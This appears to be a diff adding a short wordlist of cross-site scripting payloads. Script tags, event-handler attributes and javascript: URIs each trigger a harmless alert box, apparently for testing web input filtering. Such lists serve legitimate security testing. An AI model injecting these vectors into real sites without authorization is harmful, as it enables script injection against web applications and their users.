@@ -1,0 +1,15 @@
+<script>alert('XSS')</script>
+<script>alert(1)</script>
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=alert(1)>
+<svg onload=alert('XSS')>
+<body onload=alert('XSS')>
+<iframe src=javascript:alert('XSS')>
+<details open ontoggle=alert('XSS')>
+<marquee onstart=alert('XSS')>
+javascript:alert('XSS')
+"><script>alert('XSS')</script>
+'><script>alert('XSS')</script>
+</script><script>alert('XSS')</script>
+<IMG SRC="javascript:alert('XSS');">
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
